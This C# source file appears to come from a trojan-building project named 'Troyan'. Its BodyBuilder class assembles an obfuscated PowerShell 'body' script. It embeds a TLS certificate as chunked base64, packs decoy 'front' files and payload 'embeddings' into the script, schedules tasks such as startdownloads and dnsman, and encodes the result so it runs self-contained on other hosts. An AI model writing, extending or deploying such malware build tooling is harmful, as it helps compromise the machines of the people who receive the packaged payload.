namespace Troyan.Core;

public sealed class BodyBuilder : CustomBuilder
{
    public BodyBuilder(TroyanBuildMode mode, IPowerShellObfuscator obfuscator) : base(mode, obfuscator)
    {
    }

    protected override string SourceDir => L.TroyanScriptDir;

    protected override string OutputFile => Mode == TroyanBuildMode.Debug ? L.BodyPs1Debug : L.BodyPs1;

    protected override string[] PriorityTasks => new[] { "startdownloads", "dnsman", "cert" };
    protected override string[] UnpriorityTasks => new[] { "extraupdate" };
    protected override string EntryPoint => "program";

    protected override void InternalBuild(string server)
    {
        MakeCert();
        MakeEmbeddings();
    }

    /// <summary>Writes <c>consts_cert.ps1</c> with the LAN TLS PFX as chunked base64. Reads from <see cref="ServerLayoutPaths.UserDataTlsPfx"/> (staged beside <c>server.json</c>) so the shipped body is self-contained for execution on other hosts.</summary>
    private void MakeCert()
    {
        var template = @"

        $xdata = @{
        _CERT
    }
        
";

        var pathPfx = L.UserDataTlsPfx;
        if (!File.Exists(pathPfx))
            throw new FileNotFoundException(
                $"TLS PFX not found for Troyan embed. Run CertTool (Hephaestus data cert) or copy the PFX next to server.json as: {Path.GetFileName(pathPfx)}. Expected path: {pathPfx}",
                pathPfx);

        var binaryData = File.ReadAllBytes(pathPfx);
        var base64 = CustomCryptor.EncodeBytes(binaryData);
        const int chunkSize = 200;
        var chunks = new List<string>();

        for (var i = 0; i < base64.Length; i += chunkSize)
        {
            var chunk = base64.Substring(i, Math.Min(chunkSize, base64.Length - i));
            chunks.Add(chunk);
        }

        var code = "'" + string.Join("'+" + Environment.NewLine + "'", chunks) + "'";
        var listString = "'Hephaestus'=" + code;
        template = template.Replace("_CERT", listString);

        var outputPath = Path.Combine(L.TroyanScriptDir, "consts_cert.ps1");
        File.WriteAllText(outputPath, template);
    }

    private void MakeEmbeddings()
    {
        var template = @"
        $xfront = @(
        _FRONT_X
        )
        $xfront_name = @(
        _FRONT_NAME
        )
        $xembed = @(
        _EMBED_X
        )
        $xembed_name = @(
        _EMBED_NAME
        )
";

        var (frontName, frontData) = ReadEmbeddings("front");
        template = template.Replace("_FRONT_X", frontData, StringComparison.InvariantCulture);
        template = template.Replace("_FRONT_NAME", frontName);

        var (embedName, embedData) = ReadEmbeddings("embeddings");
        template = template.Replace("_EMBED_X", embedData, StringComparison.InvariantCulture);
        template = template.Replace("_EMBED_NAME", embedName);

        var outputPath = Path.Combine(L.TroyanScriptDir, "consts_embeddings.ps1");
        File.WriteAllText(outputPath, template);
    }

    private (string fileNames, string encodedData) ReadEmbeddings(string name)
    {
        var srcFolder = Path.Combine(L.UserDataDir, name);

        if (!Directory.Exists(srcFolder))
        {
            return ("", "");
        }

        var files = Directory.GetFiles(srcFolder);

        var resultNames = new List<string>();
        var resultData = new List<string>();

        foreach (var file in files)
        {
            try
            {
                var fileName = Path.GetFileName(file);

                var fileContent = File.ReadAllBytes(file);
                var encodedContent = CustomCryptor.EncodeBytes(fileContent);

                resultNames.Add(fileName);
                resultData.Add(encodedContent);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error processing file '{file}': {ex.Message}");
            }
        }

        if (resultData.Any())
        {
            var names = ConvertArrayToQuotedString(resultNames);
            var data = ConvertArrayToQuotedString(resultData);
            return (names, data);
        }

        return ("", "");
    }

    static string ConvertArrayToQuotedString(List<string> array)
    {
        if (array == null || !array.Any())
        {
            throw new ArgumentException("Array cannot be null or empty.", nameof(array));
        }

        var quotedString = string.Join(",", array.Select(item => $"\"{item}\""));
        return quotedString;
    }

    protected override void PostBuild()
    {
        var bodyTxt = Mode == TroyanBuildMode.Debug ? L.BodyDebugTxt : L.Body;
        CustomCryptor.Encode(File.ReadAllText(OutputFile), bodyTxt);
    }
}
